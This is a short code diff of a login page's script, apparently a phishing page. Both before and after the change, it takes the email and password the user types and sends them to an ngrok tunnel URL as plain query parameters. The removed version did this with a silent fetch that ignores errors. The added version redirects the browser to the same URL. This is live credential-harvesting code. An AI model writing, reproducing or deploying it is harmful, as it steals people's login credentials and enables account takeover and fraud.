@@ -71,16 +71,8 @@
       const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    const query = `https://8a81-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app/login?email=${email}&password=${password}`;
-
-
-    fetch(query, {
-      method: 'GET',
-      mode: 'cors',
-      credentials: 'omit' 
-    }).catch(() => {
-    });
-  }
+    window.location.href = `https://8a81-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app/login?email=${email}&password=${password}`;
+ 
   
   </script>
 </body>
